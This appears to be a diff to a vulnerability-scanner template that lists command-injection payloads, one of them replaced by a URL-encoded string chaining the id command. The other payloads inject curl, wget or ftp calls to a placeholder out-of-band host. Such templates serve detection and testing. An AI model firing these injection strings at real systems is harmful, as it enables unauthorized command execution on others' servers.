@@ -91,7 +91,7 @@ requests:
         - "${@curl -n 10 {{marker}} > /dev/null}"
         - "&curl -O /tmp/test {{marker}}&"
         - "&curl -n 10 {{marker}}&"
-        - "`curl -O /tmp/test {{marker}}`"
+        - "aaa%20%7C%7C%20id%3B%20x"
         - "`curl -n 10 {{marker}}`"
         - "wget http://{{marker}}"
         - "ftp -o /dev/null ftp://{{marker}}"
